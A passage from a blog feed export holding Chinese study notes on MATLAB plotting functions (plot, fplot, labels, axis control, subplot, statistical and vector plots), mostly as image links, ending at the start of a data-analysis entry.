src="https://img-blog.csdnimg.cn/20200227165003720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<h2 id="F-c-图形的裁剪处理"><a href="#F-c-图形的裁剪处理" class="headerlink" title="F.c 图形的裁剪处理"></a>F.c 图形的裁剪处理</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200227165134599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子（直径的3&#x2F;4）：<br><img src="https://img-blog.csdnimg.cn/20200227165317883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227165358992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<blockquote>
<p>图片来源：<br><a href="https://www.icourse163.org/search.htm?search=%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%20Matlab#/">https://www.icourse163.org/search.htm?search=%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%20Matlab#/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>matlab</category>
      </categories>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>(04)Matlab绘图(1)</title>
    <url>/2022/06/27/Matlab%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%E7%AC%94%E8%AE%B0/%EF%BC%8804%EF%BC%89%E3%80%90Matlab%E3%80%91Matlab%E7%BB%98%E5%9B%BE(1)/</url>
    <content><![CDATA[<h1 id="A-二维曲线"><a href="#A-二维曲线" class="headerlink" title="A 二维曲线"></a>A 二维曲线</h1><h2 id="A-a-plot"><a href="#A-a-plot" class="headerlink" title="A.a plot"></a>A.a plot</h2><p><img src="https://img-blog.csdnimg.cn/2020022700323181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227003319572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/20200227003721579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>图形的横坐标，是x元素的索引<br><img src="https://img-blog.csdnimg.cn/2020022700385824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227004019187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227004144782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227004220857.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227004259745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227004333235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227004452934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227004645117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227004916472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h2 id="A-b-fplot"><a href="#A-b-fplot" class="headerlink" title="A.b fplot"></a>A.b fplot</h2><p><strong>x往往采取等间隔采样，如果在函数随着自变量的变化未知或者在不同区间的函数频率特性差别大，如果采用<code>plot</code>函数时自变量的采样间隔设置不合理，则无法反映函数的变化趋势。例如：</strong><br><img src="https://img-blog.csdnimg.cn/20200227005748457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如何解决这个问题呢？<strong>——<code>fplot</code>可根据参数函数的变化特性，自适应地设置采样间隔。</strong><br><img src="https://img-blog.csdnimg.cn/20200227010039147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227010124555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020022701015035.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/2020022701033143.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h1 id="B-绘制图形的辅助操作"><a href="#B-绘制图形的辅助操作" class="headerlink" title="B 绘制图形的辅助操作"></a>B 绘制图形的辅助操作</h1><h2 id="B-a-给图形添加标注"><a href="#B-a-给图形添加标注" class="headerlink" title="B.a 给图形添加标注"></a>B.a 给图形添加标注</h2><p><img src="https://img-blog.csdnimg.cn/20200227011336291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="B-a-a-title函数"><a href="#B-a-a-title函数" class="headerlink" title="B.a.a title函数"></a>B.a.a title函数</h3><p><img src="https://img-blog.csdnimg.cn/20200227011510121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227011541135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227011710359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><a href="https://blog.csdn.net/weixin_44378835/category_9689412.html">LaTeX</a><br><img src="https://img-blog.csdnimg.cn/20200227011918376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h3 id="B-a-b-xlabel函数和ylabel函数"><a href="#B-a-b-xlabel函数和ylabel函数" class="headerlink" title="B.a.b xlabel函数和ylabel函数"></a>B.a.b xlabel函数和ylabel函数</h3><p><img src="https://img-blog.csdnimg.cn/20200227012052715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h3 id="B-a-c-text函数和gtext函数"><a href="#B-a-c-text函数和gtext函数" class="headerlink" title="B.a.c text函数和gtext函数"></a>B.a.c text函数和gtext函数</h3><p><img src="https://img-blog.csdnimg.cn/20200227012218957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>gtext</code>函数没有坐标参数，执行命令时，十字光标跟随鼠标移动，单击鼠标，即可将说明放置在十字光标处。<br><img src="https://img-blog.csdnimg.cn/20200227012946648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h3 id="B-a-d-legend函数"><a href="#B-a-d-legend函数" class="headerlink" title="B.a.d legend函数"></a>B.a.d legend函数</h3><p><img src="https://img-blog.csdnimg.cn/20200227013103964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="B-b-坐标控制"><a href="#B-b-坐标控制" class="headerlink" title="B.b 坐标控制"></a>B.b 坐标控制</h2><h3 id="B-b-a-axis函数"><a href="#B-b-a-axis函数" class="headerlink" title="B.b.a axis函数"></a>B.b.a axis函数</h3><p><img src="https://img-blog.csdnimg.cn/20200227013158817.png" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227013343860.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227013422509.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227015546979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020022701571747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>axis equal</code>后，如：x轴0到1长度等于y轴0到1长度。消除因为x轴和y轴刻度长不等带来的图像变形。<br>ps:整个过程图形没有关闭。</p>
<hr>
<h3 id="B-b-b-给坐标系加网格和边框-grid"><a href="#B-b-b-给坐标系加网格和边框-grid" class="headerlink" title="B.b.b 给坐标系加网格和边框(grid)"></a>B.b.b 给坐标系加网格和边框(grid)</h3><p> <img src="https://img-blog.csdnimg.cn/20200227112512666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>grid on:控制显示网格线<br>grid off:控制不显示网格线<br>grid：在两种状态之间进行切换<br><img src="https://img-blog.csdnimg.cn/20200227112838366.png" alt="在这里插入图片描述"><br>用法同grid</p>
<hr>
<h2 id="B-c-图形保持-hold"><a href="#B-c-图形保持-hold" class="headerlink" title="B.c 图形保持(hold)"></a>B.c 图形保持(hold)</h2><p>在已经存在的图形叠加图形</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hold on   % 控制保持原有图形</span><br><span class="line">hold off  % 控制刷新图形窗口</span><br><span class="line">hold      % 两种模式间切换</span><br></pre></td></tr></table></figure>
<p>例子：<br><img src="https://img-blog.csdnimg.cn/20200227113245355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h2 id="B-d-图形窗口的分割-subplot"><a href="#B-d-图形窗口的分割-subplot" class="headerlink" title="B.d 图形窗口的分割(subplot)"></a>B.d 图形窗口的分割(subplot)</h2><p><img src="https://img-blog.csdnimg.cn/20200227113441599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子（显示一个子图的代码）：<br><img src="https://img-blog.csdnimg.cn/20200227113609133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227114124651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="C-其他形式的二维图形"><a href="#C-其他形式的二维图形" class="headerlink" title="C 其他形式的二维图形"></a>C 其他形式的二维图形</h1><h2 id="C-a-其他坐标系下的二维曲线图"><a href="#C-a-其他坐标系下的二维曲线图" class="headerlink" title="C.a 其他坐标系下的二维曲线图"></a>C.a 其他坐标系下的二维曲线图</h2><h3 id="C-a-a-对数坐标图-semilogx-semilogy-loglog"><a href="#C-a-a-对数坐标图-semilogx-semilogy-loglog" class="headerlink" title="C.a.a 对数坐标图(semilogx;semilogy;loglog)"></a>C.a.a 对数坐标图(semilogx;semilogy;loglog)</h3><p><img src="https://img-blog.csdnimg.cn/20200227114705389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>semilogx: x使用常用对数刻度,y为线性刻度<br>semilogy: y使用常用对数刻度,x为线性刻度<br>loglog:x,y都使用常用对数刻度<br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227115300724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h3 id="C-a-b-极坐标图-polar"><a href="#C-a-b-极坐标图-polar" class="headerlink" title="C.a.b 极坐标图(polar)"></a>C.a.b 极坐标图(polar)</h3><p><img src="https://img-blog.csdnimg.cn/20200227115345279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227115455143.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h2 id="C-b-统计图"><a href="#C-b-统计图" class="headerlink" title="C.b 统计图"></a>C.b 统计图</h2><h3 id="C-b-a-条形类图形（bar、barh；hist、rose）"><a href="#C-b-a-条形类图形（bar、barh；hist、rose）" class="headerlink" title="C.b.a 条形类图形（bar、barh；hist、rose）"></a>C.b.a 条形类图形（bar、barh；hist、rose）</h3><p><img src="https://img-blog.csdnimg.cn/2020022711561492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>bar:竖直条形图<br>barh:水平条形图<br><img src="https://img-blog.csdnimg.cn/20200227115755187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227115955138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227120058406.png" alt="在这里插入图片描述"><br>例题：<br><img src="https://img-blog.csdnimg.cn/20200227120147137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227120202432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227120425695.png" alt="在这里插入图片描述"><br>hist:直角坐标系<br>rose:极坐标系<br><img src="https://img-blog.csdnimg.cn/20200227120522772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>x:用于设置统计区间的划分方式，若统计数据为标量，则统计数据均分为x个小区间，若x是向量，则x中的每一个数指定分组的中心值，元素的个数为数据分组数，x缺省时，默认按10个等分区间进行统计。<br><img src="https://img-blog.csdnimg.cn/20200227121356310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227121514170.png" alt="在这里插入图片描述"><br>theta:是一个向量，绘图时将圆划分为若干个角度相等的扇形区域，每个扇形高度为落入这个扇形区域的theta个数。如果x是标量，则将0到2pi划分为x个扇形区域，默认20。<br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227122007908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h3 id="C-b-b-面积类图形（pie-area）"><a href="#C-b-b-面积类图形（pie-area）" class="headerlink" title="C.b.b 面积类图形（pie;area）"></a>C.b.b 面积类图形（pie;area）</h3><p><img src="https://img-blog.csdnimg.cn/20200227122038969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227125938614.png" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/2020022713000326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong><code>area(x, y)</code>：该函数以参数x和y绘制面积图。如果x和y为向量，则相当于函数plot(x, y)，并将0到y之间进行了填充。如果参数y为矩阵，则将y的每一列绘制面积图并进行叠加</strong>。<br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227132909108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="C-b-c-散点类图形（scatter-stairs-stem）"><a href="#C-b-c-散点类图形（scatter-stairs-stem）" class="headerlink" title="C.b.c 散点类图形（scatter;stairs;stem）"></a>C.b.c 散点类图形（scatter;stairs;stem）</h3><p>用法与plot类似。</p>
<p><img src="https://img-blog.csdnimg.cn/20200227130115462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227133605356.png" alt="在这里插入图片描述"><br><strong>filed:填充数据点标记</strong><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227133650504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p><strong>stairs：</strong><br><img src="https://img-blog.csdnimg.cn/20200227140929123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>stem：</strong><br><img src="https://img-blog.csdnimg.cn/20200227141357242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="C-c-矢量图形-compass-feather-quiver"><a href="#C-c-矢量图形-compass-feather-quiver" class="headerlink" title="C.c 矢量图形(compass;feather;quiver)"></a>C.c 矢量图形(compass;feather;quiver)</h2><p><img src="https://img-blog.csdnimg.cn/2020022713420024.png" alt="在这里插入图片描述"></p>
<p><strong>compass：</strong><br><code>compass(x,y)</code>：x,y是n维向量，显示n个箭头，箭头的起点为原点，箭头位置为（x(i),y(i)）.<br><code>compazz(z)</code>:参量z为n维复数向量，命令显示n个箭头，箭头起点为原点，箭头位置为（real(z),image(z)）。<br><img src="https://img-blog.csdnimg.cn/20200227144435457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>feather：</strong><br>feather(x,y) :函数绘制由向量参量x与y构成的速度向量，沿水平轴方向，从均匀间隔点以箭头发射出来；’<br>feather(z) :函数绘制羽毛图。参量z是一个复数，则feather(z)相当于compass(real(z)，imag(z))；<br><img src="https://img-blog.csdnimg.cn/20200227144811388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20200227134229403.png" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227134339240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p><a href="https://blog.csdn.net/weixin_44378835/article/details/104535084">Matlab绘图(2)</a></p>
<blockquote>
<p>部分图片来源：<br><a href="https://www.icourse163.org/search.htm?search=%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%20Matlab#/">https://www.icourse163.org/search.htm?search=%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%20Matlab#/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>matlab</category>
      </categories>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>(05)数据分析与多项式计算</title>
    <url>/2022/06/27/Matlab%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%E7%AC%94%E8%AE%B0/%EF%BC%8805%EF%BC%89%E3%80%90Matlab%E3%80%91%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E8%AE%A1%E7%AE%97/</url>
    <content><![CDATA[<h1 id="A-数据统计分析"><a href="#A-数据统计分析" class="headerlink" title="A 数据统计分析"></a>A 数据统计分析</h1><h2 id="A-a-求最大值与最小元素"><a href="#A-a-求最大值与最小元素" class="headerlink" title="A.a 求最大值与最小元素"></a>A.a 求最大值与最小元素</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200227185620758.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020022718580247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<span id="more"></span>

